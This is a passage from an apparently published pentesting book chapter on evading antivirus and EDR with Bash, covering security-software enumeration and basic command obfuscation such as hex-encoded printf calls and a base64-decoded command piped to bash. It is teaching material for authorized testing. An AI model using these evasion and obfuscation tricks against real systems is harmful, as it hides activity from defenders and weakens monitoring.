<html><head></head><body>
  <div id="_idContainer209">
   <h1 class="chapter-number" id="_idParaDest-213">
    <a id="_idTextAnchor515">
    </a>
    <span class="koboSpan" id="kobo.1.1">
     14
    </span>
   </h1>
   <h1 id="_idParaDest-214">
    <a id="_idTextAnchor516">
    </a>
    <span class="koboSpan" id="kobo.2.1">
     Evasion and Obfuscation
    </span>
   </h1>
   <p>
    <span class="koboSpan" id="kobo.3.1">
     In cybersecurity, mastering
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.4.1">
      evasion
     </span>
    </strong>
    <span class="koboSpan" id="kobo.5.1">
     and
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.6.1">
      obfuscation
     </span>
    </strong>
    <span class="koboSpan" id="kobo.7.1">
     techniques
    </span>
    <a id="_idIndexMarker869">
    </a>
    <span class="koboSpan" id="kobo.8.1">
     is critical for both offense
    </span>
    <a id="_idIndexMarker870">
    </a>
    <span class="koboSpan" id="kobo.9.1">
     and defense.
    </span>
    <span class="koboSpan" id="kobo.9.2">
     With the
    </span>
    <a id="_idIndexMarker871">
    </a>
    <span class="koboSpan" id="kobo.10.1">
     rise of
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.11.1">
      antivirus
     </span>
    </strong>
    <span class="koboSpan" id="kobo.12.1">
     (
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.13.1">
      AV
     </span>
    </strong>
    <span class="koboSpan" id="kobo.14.1">
     ) and
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.15.1">
      Endpoint Detection and Response
     </span>
    </strong>
    <span class="koboSpan" id="kobo.16.1">
     (
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.17.1">
      EDR
     </span>
    </strong>
    <span class="koboSpan" id="kobo.18.1">
     ) systems, pentesters
    </span>
    <a id="_idIndexMarker872">
    </a>
    <span class="koboSpan" id="kobo.19.1">
     must now learn evasion skills traditionally used by red teams.
    </span>
    <span class="koboSpan" id="kobo.19.2">
     Without these skills, your efforts to identify vulnerabilities and create exploit proofs of concept could be blocked, possibly leading to false negatives regarding
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.20.1">
      system vulnerabilities.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.21.1">
     This chapter focuses on using the Bash shell to implement these techniques, specifically in the context of evading detection
    </span>
    <a id="_idTextAnchor517">
    </a>
    <a id="_idTextAnchor518">
    </a>
    <span class="koboSpan" id="kobo.22.1">
     by AV and EDR systems during pentesting activities.
    </span>
    <span class="koboSpan" id="kobo.22.2">
     AV and EDR were formerly only found in Windows environments.
    </span>
    <span class="koboSpan" id="kobo.22.3">
     Today, they are frequently deployed to
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.23.1">
      Linux/Unix systems.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.24.1">
     Throughout this chapter, we will explore various methods of creating and executing Bash scripts that minimize the risk of detection.
    </span>
    <span class="koboSpan" id="kobo.24.2">
     We’ll begin by examining how to enumerate the environment for AV and EDR presence, then progress through basic and advanced obfuscation techniques.
    </span>
    <span class="koboSpan" id="kobo.24.3">
     Finally, we’ll look at automating the generation of
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.25.1">
      evasion scripts.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.26.1">
     By the end of this chapter, you will have a solid understanding of how AV and EDR systems function, common detection mechanisms, and practical skills in employing obfuscation and evasion tactics using Bash.
    </span>
    <span class="koboSpan" id="kobo.26.2">
     These skills are valuable not only for pentesters but also for security professionals seeking to enhance their defensive capabilities by understanding the techniques used by
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.27.1">
      potential attackers.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.28.1">
     In this chapter, we’re going to cover the following
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.29.1">
      main topi
     </span>
     <a id="_idTextAnchor519">
     </a>
     <a id="_idTextAnchor520">
     </a>
     <span class="koboSpan" id="kobo.30.1">
      cs:
     </span>
    </span>
   </p>
   <ul>
    <li>
     <span class="koboSpan" id="kobo.31.1">
      Enumerating the environment for AV
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.32.1">
       and EDR
      </span>
     </span>
    </li>
    <li>
     <span class="koboSpan" id="kobo.33.1">
      Basic obfuscation techniques
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.34.1">
       in Bash
      </span>
     </span>
    </li>
    <li>
     <span class="koboSpan" id="kobo.35.1">
      Advanced evasion tactics
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.36.1">
       using Bash
      </span>
     </span>
    </li>
    <li>
     <span class="koboSpan" id="kobo.37.1">
      Automating evasion script generation
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.38.1">
       in Bash
      </span>
     </span>
    </li>
   </ul>
   <h1 id="_idParaDest-215">
    <a id="_idTextAnchor521">
    </a>
    <span class="koboSpan" id="kobo.39.1">
     Technical requirements
    </span>
   </h1>
   <p>
    <span class="koboSpan" id="kobo.40.1">
     To complete this chapter, we need access to a Linux environment with a Bash shell to execute the examples.
    </span>
    <span class="koboSpan" id="kobo.40.2">
     Additionally, prerequisite Bash utilities can be installed by executing the
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.41.1">
      following command:
     </span>
    </span>
   </p>
   <pre class="console"><span class="koboSpan" id="kobo.42.1">
$ sudo apt update &amp;&amp; sudo apt install -y openssl dnsutils</span></pre>
   <p>
    <span class="koboSpan" id="kobo.43.1">
     The code for this chapter can be found
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.44.1">
      at
     </span>
    </span>
    <a href="https://github.com/PacktPublishing/Bash-Shell-Scripting-for-Pentesters/tree/main/Chapter14">
     <span class="No-Break">
      <span class="koboSpan" id="kobo.45.1">
       https://github.com/PacktPublishing/Bash-Shell-Scripting-for-Pentesters/tree/main/Chapter14
      </span>
     </span>
    </a>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.46.1">
      .
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.47.1">
     With the prerequisites out of the way, let’s
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.48.1">
      dive in!
     </span>
    </span>
   </p>
   <h1 id="_idParaDest-216">
    <a id="_idTextAnchor522">
    </a>
    <span class="koboSpan" id="kobo.49.1">
     Enumerating the environment for AV and EDR
    </span>
   </h1>
   <p>
    <span class="koboSpan" id="kobo.50.1">
     Before attempting
    </span>
    <a id="_idIndexMarker873">
    </a>
    <span class="koboSpan" id="kobo.51.1">
     any evasion
    </span>
    <a id="_idIndexMarker874">
    </a>
    <span class="koboSpan" id="kobo.52.1">
     techniques, it’s essential to understand the security landscape of the target system.
    </span>
    <span class="koboSpan" id="kobo.52.2">
     This section focuses on identifying and analyzing the presence of AV and EDR solutions using Bash scripting.
    </span>
    <span class="koboSpan" id="kobo.52.3">
     We’ll explore practical methods of gathering information about installed security software, active monitoring processes, and system configurations that may impact our pentesting activities.
    </span>
    <span class="koboSpan" id="kobo.52.4">
     By using Bash commands and scripts, we’ll develop a systematic approach to reconnaissance.
    </span>
    <span class="koboSpan" id="kobo.52.5">
     This will enable more effective and targeted evasion strategies in subsequent phases of
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.53.1">
      our assessment.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.54.1">
     Environment reconnaissance is a critical first step in any pentest engagement, especially when dealing with systems protected by AV and EDR solutions.
    </span>
    <span class="koboSpan" id="kobo.54.2">
     This process involves gathering detailed information about the target system’s security measures, which is essential for
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.55.1">
      several reasons:
     </span>
    </span>
   </p>
   <ul>
    <li>
     <strong class="bold">
      <span class="koboSpan" id="kobo.56.1">
       Tailored approach
      </span>
     </strong>
     <span class="koboSpan" id="kobo.57.1">
      : By understanding the specific AV/EDR solutions in place, you can customize your pentest techniques to avoid detection.
     </span>
     <span class="koboSpan" id="kobo.57.2">
      Each security solution has its own strengths and weaknesses, and knowing these allows you to adapt your
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.58.1">
       methods accordingly.
      </span>
     </span>
    </li>
    <li>
     <strong class="bold">
      <span class="koboSpan" id="kobo.59.1">
       Risk mitigation
      </span>
     </strong>
     <span class="koboSpan" id="kobo.60.1">
      : Reconnaissance helps identify potential risks associated with your testing activities.
     </span>
     <span class="koboSpan" id="kobo.60.2">
      For example, some EDR solutions might trigger alerts or even automatic responses to certain actions.
     </span>
     <span class="koboSpan" id="kobo.60.3">
      Understanding these risks allows you to plan your testing more carefully and avoid
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.61.1">
       unintended disruptions.
      </span>
     </span>
    </li>
    <li>
     <strong class="bold">
      <span class="koboSpan" id="kobo.62.1">
       Efficiency
      </span>
     </strong>
     <span class="koboSpan" id="kobo.63.1">
      : Knowing the security landscape helps you focus your efforts on techniques that are more likely to succeed.
     </span>
     <span class="koboSpan" id="kobo.63.2">
      This saves time and resources by avoiding methods that are likely to be detected or blocked by the identified
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.64.1">
       security solutions.
      </span>
     </span>
    </li>
    <li>
     <strong class="bold">
      <span class="koboSpan" id="kobo.65.1">
       Realistic assessment
      </span>
     </strong>
     <span class="koboSpan" id="kobo.66.1">
      : Understanding the target environment allows you to provide a more accurate assessment of the system’s security posture.
     </span>
     <span class="koboSpan" id="kobo.66.2">
      This includes evaluating how well the existing security solutions are configured and identifying any gaps
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.67.1">
       in protection.
      </span>
     </span>
    </li>
    <li>
     <strong class="bold">
      <span class="koboSpan" id="kobo.68.1">
       Stealth
      </span>
     </strong>
     <span class="koboSpan" id="kobo.69.1">
      : In scenarios where maintaining a low profile is critical, environment reconnaissance allows you to design your tests to minimize the risk of detection.
     </span>
     <span class="koboSpan" id="kobo.69.2">
      This is particularly important in red team exercises or when testing
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.70.1">
       production systems.
      </span>
     </span>
    </li>
   </ul>
   <p>
    <span class="koboSpan" id="kobo.71.1">
     Let’s first take a
    </span>
    <a id="_idIndexMarker875">
    </a>
    <span class="koboSpan" id="kobo.72.1">
     look at
    </span>
    <a id="_idIndexMarker876">
    </a>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.73.1">
      process enumeration:
     </span>
    </span>
   </p>
   <ol>
    <li>
     <span class="koboSpan" id="kobo.74.1">
      One of the primary methods is examining running processes.
     </span>
     <span class="koboSpan" id="kobo.74.2">
      This can be done using commands such as
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.75.1">
       ps
      </span>
     </strong>
     <span class="koboSpan" id="kobo.76.1">
      ,
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.77.1">
       top
      </span>
     </strong>
     <span class="koboSpan" id="kobo.78.1">
      ,
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.79.1">
       or
      </span>
     </span>
     <span class="No-Break">
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.80.1">
        htop
       </span>
      </strong>
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.81.1">
       .
      </span>
     </span>
     <p class="list-inset">
      <span class="koboSpan" id="kobo.82.1">
       The following shows how to list all
      </span>
      <span class="No-Break">
       <span class="koboSpan" id="kobo.83.1">
        running processes:
       </span>
      </span>
     </p>
     <pre class="source-code">
<strong class="bold"><span class="koboSpan" id="kobo.84.1">$ sudo ps aux</span></strong></pre>
     <p class="list-inset">
      <span class="koboSpan" id="kobo.85.1">
       This command looks for specific AV/EDR
      </span>
      <span class="No-Break">
       <span class="koboSpan" id="kobo.86.1">
        process names:
       </span>
      </span>
     </p>
     <pre class="source-code"><strong class="bold"><span class="koboSpan" id="kobo.87.1">$ sudo ps aux | grep -E "(av|edr|protect|defend|guard)"</span></strong></pre>
     <p class="list-inset">
      <span class="koboSpan" id="kobo.88.1">
       The output will have many false positives due to the short
      </span>
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.89.1">
        av
       </span>
      </strong>
      <span class="koboSpan" id="kobo.90.1">
       and
      </span>
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.91.1">
        edr
       </span>
      </strong>
      <span class="koboSpan" id="kobo.92.1">
       strings since they may match other unrelated words.
      </span>
      <span class="koboSpan" id="kobo.92.2">
       Review the
      </span>
      <span class="No-Break">
       <span class="koboSpan" id="kobo.93.1">
        output carefully.
       </span>
      </span>
     </p>
    </li>
    <li>
     <span class="koboSpan" id="kobo.94.1">
      Filesystem analysis is another important aspect of endpoint protection software enumeration, that is, checking for the presence of specific files or directories associated with
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.95.1">
       AV/EDR solutions.
      </span>
     </span>
     <p class="list-inset">
      <span class="koboSpan" id="kobo.96.1">
       We can search for common AV/EDR-related directories,
      </span>
      <span class="No-Break">
       <span class="koboSpan" id="kobo.97.1">
        as follows:
       </span>
      </span>
     </p>
     <pre class="source-code">
<strong class="bold"><span class="koboSpan" id="kobo.98.1">$ ls -l /opt /etc | grep -E "(av|antivirus|edr|protect)"</span></strong></pre>
     <p class="list-inset">
      <span class="koboSpan" id="kobo.99.1">
       The following command finds files with
      </span>
      <span class="No-Break">
       <span class="koboSpan" id="kobo.100.1">
        specific names:
       </span>
      </span>
     </p>
     <pre class="source-code"><strong class="bold"><span class="koboSpan" id="kobo.101.1">$ find / -name "*antivirus*" -o -name "*edr*" 2&gt;/dev/null</span></strong></pre>
    </li>
    <li>
     <span class="koboSpan" id="kobo.102.1">
      You should also be examining network connections to reveal communication with AV/EDR
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.103.1">
       management servers.
      </span>
     </span>
     <p class="list-inset">
      <span class="koboSpan" id="kobo.104.1">
       The
      </span>
      <a id="_idIndexMarker877">
      </a>
      <span class="koboSpan" id="kobo.105.1">
       following
      </span>
      <a id="_idIndexMarker878">
      </a>
      <span class="koboSpan" id="kobo.106.1">
       example lists all active
      </span>
      <span class="No-Break">
       <span class="koboSpan" id="kobo.107.1">
        network connections:
       </span>
      </span>
     </p>
     <pre class="source-code">
<strong class="bold"><span class="koboSpan" id="kobo.108.1">$ netstat -tuln</span></strong></pre>
     <p class="list-inset">
      <span class="koboSpan" id="kobo.109.1">
       In this example, we check for outbound connections to known
      </span>
      <span class="No-Break">
       <span class="koboSpan" id="kobo.110.1">
        AV/EDR servers:
       </span>
      </span>
     </p>
     <pre class="source-code"><strong class="bold"><span class="koboSpan" id="kobo.111.1">$ ss -tuln | grep -E "(8080|443|22)"</span></strong></pre>
    </li>
    <li>
     <span class="koboSpan" id="kobo.112.1">
      And, of course, we can’t forget service enumeration.
     </span>
     <span class="koboSpan" id="kobo.112.2">
      Many AV/EDR solutions run
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.113.1">
       as services.
      </span>
     </span>
     <p class="list-inset">
      <span class="koboSpan" id="kobo.114.1">
       The following example lists
      </span>
      <span class="No-Break">
       <span class="koboSpan" id="kobo.115.1">
        all services:
       </span>
      </span>
     </p>
     <pre class="source-code">
<strong class="bold"><span class="koboSpan" id="kobo.116.1">$ systemctl list-units --type=service</span></strong></pre>
     <p class="list-inset">
      <span class="koboSpan" id="kobo.117.1">
       After listing services, we can check the status of specific services
      </span>
      <span class="No-Break">
       <span class="koboSpan" id="kobo.118.1">
        as follows:
       </span>
      </span>
     </p>
     <pre class="source-code"><strong class="bold"><span class="koboSpan" id="kobo.119.1">$ systemctl status avservice.service</span></strong></pre>
    </li>
    <li>
     <span class="koboSpan" id="kobo.120.1">
      Some AV/EDR solutions use kernel modules.
     </span>
     <span class="koboSpan" id="kobo.120.2">
      The following command will help you to reveal kernel modules potentially used for
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.121.1">
       endpoint protection:
      </span>
     </span>
     <pre class="source-code">
<strong class="bold"><span class="koboSpan" id="kobo.122.1">$ lsmod</span></strong></pre>
     <p class="list-inset">
      <span class="koboSpan" id="kobo.123.1">
       We can refine the previous command to check for
      </span>
      <span class="No-Break">
       <span class="koboSpan" id="kobo.124.1">
        specific modules:
       </span>
      </span>
     </p>
     <pre class="source-code"><strong class="bold"><span class="koboSpan" id="kobo.125.1">$ lsmod | grep -E "(av|edr|protect)"</span></strong></pre>
    </li>
    <li>
     <span class="koboSpan" id="kobo.126.1">
      Don’t forget about system logs.
     </span>
     <span class="koboSpan" id="kobo.126.2">
      Examining system logs can reveal AV/EDR activity.
     </span>
     <span class="koboSpan" id="kobo.126.3">
      Check the system logs for AV/EDR-related entries
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.127.1">
       as follows:
      </span>
     </span>
     <pre class="source-code">
<strong class="bold"><span class="koboSpan" id="kobo.128.1">$ grep -E "(av|antivirus|edr)" /var/log/syslog</span></strong></pre>
    </li>
    <li>
     <span class="koboSpan" id="kobo.129.1">
      Package manager metadata is another good source of intel.
     </span>
     <span class="koboSpan" id="kobo.129.2">
      On systems using package managers, you can query for installed
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.130.1">
       security
      </span>
      <a id="_idTextAnchor523">
      </a>
      <a id="_idTextAnchor524">
      </a>
      <span class="koboSpan" id="kobo.131.1">
       software.
      </span>
     </span>
     <p class="list-inset">
      <span class="koboSpan" id="kobo.132.1">
       The following command works for
      </span>
      <span class="No-Break">
       <span class="koboSpan" id="kobo.133.1">
        Debian-based systems:
       </span>
      </span>
     </p>
     <pre class="source-code">
<strong class="bold"><span class="koboSpan" id="kobo.134.1">$ dpkg -l | grep -E "(av|antivirus|edr)"</span></strong></pre>
     <p class="list-inset">
      <span class="koboSpan" id="kobo.135.1">
       The following command works for Red
      </span>
      <span class="No-Break">
       <span class="koboSpan" id="kobo.136.1">
        Hat-based systems:
       </span>
      </span>
     </p>
     <pre class="source-code"><strong class="bold"><span class="koboSpan" id="kobo.137.1">$ rpm -qa | grep -E "(av|antivirus|edr)"</span></strong></pre>
    </li>
    <li>
     <span class="koboSpan" id="kobo.138.1">
      Just like privilege escalation, always check environment variables.
     </span>
     <span class="koboSpan" id="kobo.138.2">
      Some AV/EDR solutions set
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.139.1">
       environment variables.
      </span>
     </span>
     <p class="list-inset">
      <span class="koboSpan" id="kobo.140.1">
       We can list all environment variables
      </span>
      <span class="No-Break">
       <span class="koboSpan" id="kobo.141.1">
        as shown:
       </span>
      </span>
     </p>
     <pre class="source-code">
<strong class="bold"><span class="koboSpan" id="kobo.142.1">$ env</span></strong></pre>
     <p class="list-inset">
      <span class="koboSpan" id="kobo.143.1">
       We can further refine this to look for specific
      </span>
      <span class="No-Break">
       <span class="koboSpan" id="kobo.144.1">
        AV/EDR-related variables:
       </span>
      </span>
     </p>
     <pre class="source-code"><strong class="bold"><span class="koboSpan" id="kobo.145.1">$ env | grep -E "(AV|EDR|PROTECT)"</span></strong></pre>
    </li>
   </ol>
   <p>
    <span class="koboSpan" id="kobo.146.1">
     When implementing
    </span>
    <a id="_idIndexMarker879">
    </a>
    <span class="koboSpan" id="kobo.147.1">
     these
    </span>
    <a id="_idIndexMarker880">
    </a>
    <span class="koboSpan" id="kobo.148.1">
     techniques in Bash scripts, it’s important to combine multiple methods for a full approach.
    </span>
    <span class="koboSpan" id="kobo.148.2">
     Here’s a simple example that combines several of these approaches.
    </span>
    <span class="koboSpan" id="kobo.148.3">
     You can find the following code in this chapter’s GitHub repository
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.149.1">
      as
     </span>
    </span>
    <span class="No-Break">
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.150.1">
       ch14_gather_bas
      </span>
      <a id="_idTextAnchor525">
      </a>
      <a id="_idTextAnchor526">
      </a>
      <span class="koboSpan" id="kobo.151.1">
       ic_info.sh
      </span>
     </strong>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.152.1">
      :
     </span>
    </span>
   </p>
   <pre class="source-code"><span class="koboSpan" id="kobo.153.1">
#!/usr/bin/env bash
echo "Checking for AV/EDR presence..."
</span><span class="koboSpan" id="kobo.153.2"># Process check
echo "Processes:"
ps aux | grep -E "(av|edr|protect|defend|guard)"
# File system check
echo "Suspicious directories:"
ls -l /opt /etc | grep -E "(av|antivirus|edr|protect)"
# Network connections
echo "Network connections:"
ss -tuln | grep -E "(8080|443|22)"
# Service check
echo "Services:"
systemctl list-units --type=service | grep -E "(av|antivirus|edr)"
# Kernel modules
echo "Kernel modules:"
lsmod | grep -E "(av|edr|protect)"
echo "Enumeration complete."</span></pre>
   <p>
    <span class="koboSpan" id="kobo.154.1">
     AV and EDR software
    </span>
    <a id="_idIndexMarker881">
    </a>
    <span class="koboSpan" id="kobo.155.1">
     send
    </span>
    <a id="_idIndexMarker882">
    </a>
    <span class="koboSpan" id="kobo.156.1">
     data about the endpoint’s status, performance, and activities.
    </span>
    <span class="koboSpan" id="kobo.156.2">
     This is referred to as
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.157.1">
      telemetry
     </span>
    </strong>
    <span class="koboSpan" id="kobo.158.1">
     .
    </span>
    <span class="koboSpan" id="kobo.158.2">
     The
    </span>
    <a id="_idIndexMarker883">
    </a>
    <span class="koboSpan" id="kobo.159.1">
     following script checks to see whether the host is sending telemetry to common EDR domains.
    </span>
    <span class="koboSpan" id="kobo.159.2">
     You can find it in this chapter’s GitHub repository
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.160.1">
      as
     </span>
    </span>
    <span class="No-Break">
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.161.1">
       ch14_telem
      </span>
      <a id="_idTextAnchor527">
      </a>
      <a id="_idTextAnchor528">
      </a>
      <a id="_idTextAnchor529">
      </a>
      <span class="koboSpan" id="kobo.162.1">
       etry_check.sh
      </span>
     </strong>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.163.1">
      :
     </span>
    </span>
   </p>
   <pre class="source-code"><span class="koboSpan" id="kobo.164.1">
#!/usr/bin/env bash
# Array of common EDR telemetry hostnames
edr_hostnames=(
    "*.crowdstrike.com"
    "*.sentinelone.net"
    "*.carbonblack.com"
    "*.cylance.com"
    "*.symantec.com"
    "*.mcafee.com"
    "*.trendmicro.com"
    "*.sophos.com"
    "*.kaspersky.com"
    "*.fireeye.com"
)
# Function to check for EDR connections
check_edr_connections() {
    echo "Checking for EDR connections..."
</span><span class="koboSpan" id="kobo.164.2">    for hostname in "${edr_hostnames[@]}"; do
        if ss -tuar | grep -q "$hostname"; then
            echo "Found connection to $hostname"
        fi
    done
}
check_edr_connections</span></pre>
   <p>
    <span class="koboSpan" id="kobo.165.1">
     These techniques should
    </span>
    <a id="_idIndexMarker884">
    </a>
    <span class="koboSpan" id="kobo.166.1">
     provide
    </span>
    <a id="_idIndexMarker885">
    </a>
    <span class="koboSpan" id="kobo.167.1">
     you with enough information to determine whether a Linux or Unix system has any AV or EDR software installed.
    </span>
    <span class="koboSpan" id="kobo.167.2">
     We will explore obfuscation and evasion techniques in subsequent sections
    </span>
    <a id="_idTextAnchor530">
    </a>
    <a id="_idTextAnchor531">
    </a>
    <span class="koboSpan" id="kobo.168.1">
     of
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.169.1">
      this chapter.
     </span>
    </span>
   </p>
   <h1 id="_idParaDest-217">
    <a id="_idTextAnchor532">
    </a>
    <span class="koboSpan" id="kobo.170.1">
     Basic obfuscation techniques in Bash
    </span>
   </h1>
   <p>
    <span class="koboSpan" id="kobo.171.1">
     In this section, we’ll explore
    </span>
    <a id="_idIndexMarker886">
    </a>
    <span class="koboSpan" id="kobo.172.1">
     various obfuscation techniques that can be
    </span>
    <a id="_idIndexMarker887">
    </a>
    <span class="koboSpan" id="kobo.173.1">
     applied to Bash scripts.
    </span>
    <span class="koboSpan" id="kobo.173.2">
     These methods range from simple variable name alterations to more complex command substitution and encoding strategies.
    </span>
    <span class="koboSpan" id="kobo.173.3">
     By combining these techniques, pentesters can create scripts that are more likely to evade detection and
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.174.1">
      resist analysis.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.175.1">
     Obfuscation in Bash scripting is the practice of making code difficult to understand while preserving its functionality.
    </span>
    <span class="koboSpan" id="kobo.175.2">
     For pentesters, obfuscation serves as a valuable technique to evade detection by security systems and complicate reverse engineering efforts.
    </span>
    <span class="koboSpan" id="kobo.175.3">
     This section covers fundamental obfuscation methods that can be applied to
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.176.1">
      Bash scripts.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.177.1">
     Bash script obfuscation involves modifying the script’s appearance and structure without altering its behavior.
    </span>
    <span class="koboSpan" id="kobo.177.2">
     The goal is to create code that functions identically to the original but is challenging for humans or automated systems to interpret.
    </span>
    <span class="koboSpan" id="kobo.177.3">
     While obfuscation doesn’t provide foolproof protection, it can significantly increase the effort required to analyze and understand
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.178.1">
      the script.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.179.1">
     Here’s a simple example to illustrate
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.180.1">
      the concept:
     </span>
    </span>
   </p>
   <pre class="console"><span class="koboSpan" id="kobo.181.1">
#!/usr/bin/env bash
echo "Hello, World!"</span></pre>
   <p>
    <span class="koboSpan" id="kobo.182.1">
     This straightforward script could be obfuscated
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.183.1">
      as follows:
     </span>
    </span>
   </p>
   <pre class="console"><span class="koboSpan" id="kobo.184.1">
#</span><a id="_idTextAnchor533"/><a id="_idTextAnchor534"/><span class="koboSpan" id="kobo.185.1">!/usr/bin/env bash
$(printf "\x65\x63\x68\x6f") "$(printf "\x48\x65\x6c\x6c\x6f\x2c\x20\x57\x6f\x72\x6c\x64\x21")"</span></pre>
   <p>
    <span class="koboSpan" id="kobo.186.1">
     The
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.187.1">
      printf
     </span>
    </strong>
    <span class="koboSpan" id="kobo.188.1">
     command uses command substitution with the hexadecimal representation of the text
    </span>
    <span class="No-Break">
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.189.1">
       Hello World
      </span>
     </strong>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.190.1">
      .
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.191.1">
     Both scripts produce the same output, but the second one is considerably more difficult to read at
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.192.1">
      a glance.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.193.1">
     The next example uses basic variable substitution to run the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.194.1">
      sudo -l
     </span>
    </strong>
    <span class="koboSpan" id="kobo.195.1">
     command, which is detected by the
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.196.1">
      EDR agent:
     </span>
    </span>
   </p>
   <pre class="console"><span class="koboSpan" id="kobo.197.1">
cmd="sudo"
args="-l"
$cmd $args</span></pre>
   <p>
    <span class="koboSpan" id="kobo.198.1">
     We can do more advanced command substitution with
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.199.1">
      prin
     </span>
     <a id="_idTextAnchor535">
     </a>
     <a id="_idTextAnchor536">
     </a>
     <span class="koboSpan" id="kobo.200.1">
      tf
     </span>
     <a id="_idTextAnchor537">
     </a>
     <a id="_idTextAnchor538">
     </a>
    </strong>
    <span class="koboSpan" id="kobo.201.1">
     , as
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.202.1">
      shown here:
     </span>
    </span>
   </p>
   <pre class="console"><span class="koboSpan" id="kobo.203.1">
$ (printf '\x73\x75\x64\x6f') $(printf '\x2d\x6c')</span></pre>
   <p>
    <span class="koboSpan" id="kobo.204.1">
     This results in running the same command, as shown in the
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.205.1">
      following figure.
     </span>
    </span>
   </p>
   <div>
    <div class="IMG---Figure" id="_idContainer207">
     <span class="koboSpan" id="kobo.206.1">
      <img alt="Figure 14.1 – The output of running an obfuscated sudo command is shown" src="image/B22229_14_01.jpg"/>
     </span>
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    <span class="koboSpan" id="kobo.207.1">
     Figure 14.1 – The output of running an obfuscated sudo command is shown
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.208.1">
     Base64 encoding can be used to obfuscate commands,
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.209.1">
      as shown:
     </span>
    </span>
   </p>
   <pre class="console"><span class="koboSpan" id="kobo.210.1">
$ echo "c3VkbyAtbA==" | base64 -d | bash</span></pre>
   <p>
    <span class="koboSpan" id="kobo.211.1">
     We can also split up
    </span>
    <a id="_idIndexMarker888">
    </a>
    <span class="koboSpan" id="kobo.212.1">
     parts
    </span>
    <a id="_idIndexMarker889">
    </a>
    <span class="koboSpan" id="kobo.213.1">
     of commands using environment variables, as shown in the
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.214.1">
      following example:
     </span>
    </span>
   </p>
   <pre class="console"><span class="koboSpan" id="kobo.215.1">
$ export CMD_PART1="su"
$ export CMD_PART2="do"
$ export ARG="-l"
$ $CMD_PART1$CMD_PART2 $ARG</span></pre>
